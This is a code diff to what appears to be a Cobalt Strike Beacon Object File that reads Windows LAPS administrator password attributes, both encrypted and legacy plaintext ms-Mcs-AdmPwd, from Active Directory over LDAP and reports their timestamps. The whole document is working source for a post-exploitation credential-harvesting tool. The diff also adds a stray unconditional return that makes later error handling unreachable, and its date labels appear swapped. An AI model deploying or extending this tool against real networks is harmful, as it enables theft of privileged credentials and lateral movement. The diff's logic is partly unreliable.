@@ -7,6 +7,7 @@
 #include <Winldap.h>
 #include "base\helpers.h"
 
+#define PROGVERS "1.1"
 #ifdef _DEBUG
 #include "base\mock.h"
 #undef DECLSPEC_IMPORT
@@ -24,10 +25,11 @@ extern "C" {
         unsigned int flags;
     };
 
-    bool searchLdap(PSTR ldapServer, ULONG port, PCHAR distinguishedName, PCHAR searchFilter, char **output, int* length) {
+    bool searchLdap(PSTR ldapServer, ULONG port, PCHAR distinguishedName, PCHAR searchFilter, char **output, int* length, char** output2, int* length2) {
 
         DFR_LOCAL(wldap32, ldap_initA);
         DFR_LOCAL(wldap32, ldap_bind_sA);
+        DFR_LOCAL(wldap32, ldap_unbind);
         DFR_LOCAL(wldap32, ldap_search_s);
         DFR_LOCAL(wldap32, ldap_count_entries);
         DFR_LOCAL(wldap32, ldap_first_entry);
@@ -37,10 +39,11 @@ extern "C" {
 
         LDAP *ldapHandle;
         PLDAPMessage searchResult = NULL;
-        PCHAR attr[] = { "msLAPS-EncryptedPassword", NULL };
+        PCHAR attr[] = { "msLAPS-EncryptedPassword", "msLAPS-PasswordExpirationTime", "msLAPS-Password", "msLAPS-EncryptedPasswordHistory", "msLAPS-EncryptedDSRMPassword", "msLAPS-EncryptedDSRMPasswordHistory", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime", NULL};
         ULONG entryCount;
         PLDAPMessage firstEntry = NULL;
         berval** outval;
+        berval** outval1;
 
         ldapHandle = ldap_initA(ldapServer, port);
         if (ldapHandle == NULL) {
@@ -50,6 +53,8 @@ extern "C" {
 
         if (ldap_bind_sA(ldapHandle, distinguishedName, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
             BeaconPrintf(CALLBACK_ERROR, "Error Initialising LDAP connection: ldap_bind_sA");
+            //Safety
+            ldap_unbind(ldapHandle);
             return false;
         }
             
@@ -57,8 +62,11 @@ extern "C" {
             
             if (searchResult != NULL)
                 ldap_msgfree(searchResult);
+                
+                return false;
 
             BeaconPrintf(CALLBACK_ERROR, "Error Using LDAP connection: ldap_search_s");
+            ldap_unbind(ldapHandle);
             return false;
         }
 
@@ -79,25 +87,49 @@ extern "C" {
                 ldap_msgfree(searchResult);
 
             BeaconPrintf(CALLBACK_ERROR, "Error ldap_first_entry");
+            ldap_unbind(ldapHandle);
             return false;
         }
 
         outval = ldap_get_values_lenA(ldapHandle, firstEntry, attr[0]);
+        
         if (outval == NULL) {
 
             if (searchResult != NULL)
                 ldap_msgfree(searchResult);
 
-            if (firstEntry != NULL)
-                ldap_msgfree(firstEntry);
+            //TODO: ChatGPT Safety note  
+            // ldap_msgfree is only for LDAPMessage* chains like searchResult. firstEntry is just a pointer inside that chain. Do not free it separately.
+            //if (firstEntry != NULL)
+            //    ldap_msgfree(firstEntry);
+            
+            BeaconPrintf(CALLBACK_ERROR, "Error ldap_get_values_lenA: msLAPS-EncryptedPassword:");
+            ldap_unbind(ldapHandle);
+            return false;
+        }
 
-            BeaconPrintf(CALLBACK_ERROR, "Error ldap_get_values_lenA");
+        outval1 = ldap_get_values_lenA(ldapHandle, firstEntry, attr[1]);
+        if (outval1 == NULL) {
+
+            if (searchResult != NULL)
+                ldap_msgfree(searchResult);
+            
+            //TODO: ChatGPT Safety note
+            //Problem: ldap_msgfree is only for LDAPMessage* chains like searchResult. firstEntry is just a pointer inside that chain. Do not free it separately.
+            //if (firstEntry != NULL)
+            //    ldap_msgfree(firstEntry);
+
+            BeaconPrintf(CALLBACK_ERROR, "Error ldap_get_values_lenA: msLAPS-PasswordExpirationTime:");
+            ldap_unbind(ldapHandle);
             return false;
         }
 
         *output = (char*)outval[0]->bv_val;
         *length = outval[0]->bv_len;
+        *output2 = (char*)outval1[0]->bv_val;
+        *length2 = outval1[0]->bv_len;
 
+        ldap_unbind(ldapHandle);
         return true;
     }
 
@@ -111,20 +143,66 @@ extern "C" {
         return mon[month - 1];
     }
 
+    PCHAR ConvertADTimestampToHumanTime(PUCHAR vRawTimestamp, INT intRawLen) {
+
+        static CHAR buf[64];
+        FILETIME ft;
+        SYSTEMTIME stUTC;
+        ULONGLONG ullTime;
+        PCHAR sADTime = (PCHAR) vRawTimestamp;
+        DFR_LOCAL(KERNEL32, FileTimeToSystemTime);
+        DFR_LOCAL(MSVCRT, sprintf);
+        DFR_LOCAL(MSVCRT, _strtoi64);
+
+        // Expect timestamp from AD should be 18 characters. If not something wrong, spec changed, or possibly it's in a different metric unit. Bail.
+        if (intRawLen != 18) {
+            BeaconPrintf(CALLBACK_ERROR, "WARNING: ADTime doesnt appear to be valid. HumanTime may be erroneous. Returning Error.\n.");
+            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
+            return buf;
+        }
+
+        // Have to conditional stoll for mingw plebs
+        ullTime = _strtoi64(sADTime, nullptr, 0x0A);
+
+        //
+        // TODO: Errno return sanity checks for ERANGE if we deem it necessary.
+        //
+
+        // Manual C-style reinterpret casts
+        *(__int64*)&ft = ullTime;
+
+        if (!FileTimeToSystemTime(&ft, &stUTC)) {
+            //BeaconPrintf(CALLBACK_ERROR, "Error: FileTimeToSystemTime conversion failed.");
+            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
+            return buf;
+        }
+
+        // Unsure if this accounts for DSTs or LeapSecs
+        if (FileTimeToSystemTime(&ft, &stUTC)) {
+            sprintf(buf, "%s/%02d/%04d %02d:%02d:%02d UTC", GetMonthAbbrev(stUTC.wMonth), stUTC.wDay, stUTC.wYear, stUTC.wHour, stUTC.wMinute, stUTC.wSecond);
+            return buf;
+        }
+        else {
+            sprintf(buf, "HUMANTIME_CONVERSION_FAIL");
+            return buf;
+        }
+    
+    }
+
     char* ConvertWinFileTimeToHumanTime(unsigned int dwLowDateTime, unsigned int dwHighDateTime) {
 
-        static char buf[64];
+        static CHAR buf[64];
         FILETIME ft;
-        SYSTEMTIME st;
+        SYSTEMTIME stUTC;
         DFR_LOCAL(KERNEL32, FileTimeToSystemTime);
         DFR_LOCAL(MSVCRT, sprintf);
 
         ft.dwLowDateTime = dwLowDateTime;
         ft.dwHighDateTime =  dwHighDateTime;
 
-        //Unsure if this accounts for DSTs or LeapSecs
-        if (FileTimeToSystemTime(&ft, &st)) {
-            sprintf(buf, "%s/%02d/%04d %02d:%02d:%02d UTC", GetMonthAbbrev(st.wMonth), st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
+        // Unsure if this accounts for DSTs or LeapSecs
+        if (FileTimeToSystemTime(&ft, &stUTC)) {
+            sprintf(buf, "%s/%02d/%04d %02d:%02d:%02d UTC", GetMonthAbbrev(stUTC.wMonth), stUTC.wDay, stUTC.wYear, stUTC.wHour, stUTC.wMinute, stUTC.wSecond);
             return buf;
         }
         else {
@@ -283,8 +361,8 @@ extern "C" {
     }
 
     void go(char* args, int len) {
-        unsigned char* output;
-        int length;
+        unsigned char *output, *output2;
+        int length, length2;
         struct blob_header* header;
         datap  parser;
 
@@ -308,12 +386,12 @@ extern "C" {
         }
 
         sprintf(ldapSearch, "(&(objectClass=computer)(distinguishedName=%s))", distinguishedName);
-        if (!searchLdap(domainController, 389, rootDN, ldapSearch, (char**)&output, &length)) {
+        if (!searchLdap(domainController, 389, rootDN, ldapSearch, (char**)&output, &length, (char**)&output2, &length2)) {
             return;
         }
 
         header = (struct blob_header*)output;
-        BeaconPrintf(CALLBACK_OUTPUT, "LAPSv2 Blob Header Info:\nUpper Date Timestamp: %d\nLower Date Timestamp: %d\nPassword Last Set Date: %s\nEncrypted Buffer Size: %d\nFlags: %d\n", header->upperdate, header->lowerdate, ConvertWinFileTimeToHumanTime(header->lowerdate, header->upperdate), header->encryptedBufferSize, header->flags);
+        BeaconPrintf(CALLBACK_OUTPUT, "=== LAPSv2 Account Information ===:\nUpper Date Timestamp: %d\nLower Date Timestamp: %d\nPassword Expiry Date: %s \nPassword Last Update: %s\nEncrypted Buffer Size: %d\nFlags: %d\n", header->upperdate, header->lowerdate, ConvertWinFileTimeToHumanTime(header->lowerdate, header->upperdate), ConvertADTimestampToHumanTime(output2, length2), header->encryptedBufferSize, header->flags);
 
         if (header->encryptedBufferSize != length - sizeof(struct blob_header)) {
             BeaconPrintf(CALLBACK_ERROR, "Header Length (%d) and LDAP Returned Length (%d) Don't Match.. decryption may fail", header->encryptedBufferSize, length-sizeof(blob_header));
